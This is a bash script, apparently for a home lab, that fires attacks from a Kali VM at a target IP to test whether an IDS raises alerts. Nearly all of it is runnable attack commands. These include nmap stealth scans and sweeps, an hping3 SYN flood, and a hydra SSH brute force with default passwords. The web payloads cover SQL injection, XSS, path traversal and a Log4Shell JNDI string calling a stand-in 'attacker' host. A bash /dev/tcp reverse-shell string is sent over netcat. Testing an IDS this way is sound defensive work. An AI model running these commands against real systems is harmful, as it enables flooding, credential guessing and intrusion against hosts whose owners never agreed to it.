#!/usr/bin/env bash
# Run FROM the Kali VM against the Mac IDS host. Lab use only — your own machines.
# Usage: ./kali_attacks.sh <target_ip> [scenario]
#   scenarios: portscan stealth sweep synflood brute web icmp shell all (default all)
set -uo pipefail

TARGET="${1:?usage: kali_attacks.sh <target_ip> [scenario]}"
SCENARIO="${2:-all}"
GW="$(ip route | awk '/default/{print $3; exit}')"

banner(){ echo; echo "=== $* ==="; }
have(){ command -v "$1" >/dev/null 2>&1; }

portscan(){ banner "TCP SYN scan (nmap -sS)"; sudo nmap -sS -T4 -p 1-1000 "$TARGET"; }
stealth(){ banner "Stealth scans (NULL/FIN/XMAS)";
  sudo nmap -sN "$TARGET"; sudo nmap -sF "$TARGET"; sudo nmap -sX "$TARGET"; }
sweep(){ banner "Ping sweep (nmap -sn) across /24";
  sudo nmap -sn "${TARGET%.*}.0/24"; }
synflood(){ banner "SYN flood (hping3, 10s)";
  have hping3 && sudo timeout 10 hping3 -S --flood -p 80 "$TARGET" || echo "install hping3"; }
brute(){ banner "SSH brute force (hydra, small list)";
  printf 'root\nadmin\nkali\n' > /tmp/u.txt; printf 'toor\npassword\n123456\n' > /tmp/p.txt
  have hydra && hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 ssh://"$TARGET" || echo "install hydra"; }
web(){ banner "Web attacks (curl payloads)"
  curl -s -m 3 "http://$TARGET/?id=1'+OR+'1'='1+UNION+SELECT+user,pass+FROM+users--" -o /dev/null
  curl -s -m 3 "http://$TARGET/?q=<script>document.cookie</script>" -o /dev/null
  curl -s -m 3 "http://$TARGET/../../../../etc/passwd" -o /dev/null
  curl -s -m 3 -H 'X-Api: ${jndi:ldap://attacker/x}' "http://$TARGET:8080/" -o /dev/null
  curl -s -m 3 -A "sqlmap/1.7" "http://$TARGET/" -o /dev/null
  have nikto && nikto -h "http://$TARGET/" -maxtime 20s || echo "(nikto optional)"; }
icmp(){ banner "Oversized ICMP (tunnel-like)"; ping -c 3 -s 900 "$TARGET"; }
shell(){ banner "Reverse-shell string over the wire (benign netcat probe)"
  printf 'bash -i >& /dev/tcp/%s/4444 0>&1\n' "$GW" | nc -w2 "$TARGET" 4444 2>/dev/null || echo "(no listener; string still crosses wire for IDS)"; }

run(){ case "$1" in
  portscan) portscan;; stealth) stealth;; sweep) sweep;; synflood) synflood;;
  brute) brute;; web) web;; icmp) icmp;; shell) shell;;
  all) portscan; stealth; sweep; web; icmp; brute; synflood;;
  *) echo "unknown scenario: $1"; exit 1;; esac; }

echo "target=$TARGET gateway=$GW scenario=$SCENARIO"
run "$SCENARIO"
echo; echo "done — check the IDS console/alert log on the target."
